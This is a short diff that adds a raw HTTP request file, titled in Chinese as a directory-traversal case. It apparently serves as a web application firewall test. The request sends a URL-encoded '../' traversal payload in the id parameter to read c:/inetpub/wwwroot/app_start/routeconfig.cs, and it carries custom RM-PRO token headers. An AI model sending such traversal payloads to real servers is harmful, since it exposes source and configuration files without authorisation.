@@ -1,0 +1,9 @@
+# 目录遍历_routeconfig.cs
+# 在 ASP.NET 应用程序中，routeconfig.cs 文件通常包含路由配置信息，用于定义 URL 路由规则，将特定的 URL 请求映射到相应的处理程序或控制器上。
+GET /?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fc:%2Finetpub%2Fwwwroot%2Fapp_start%2Frouteconfig.cs&bid=hd_tag_m8mv25bu HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25bu
+RM-PRO-Token: 1b382e756a8901b7bebfbfee619385eb
+RM-PRO-Time: 1742808458931
+User-Agent: curl/7.83.1
+
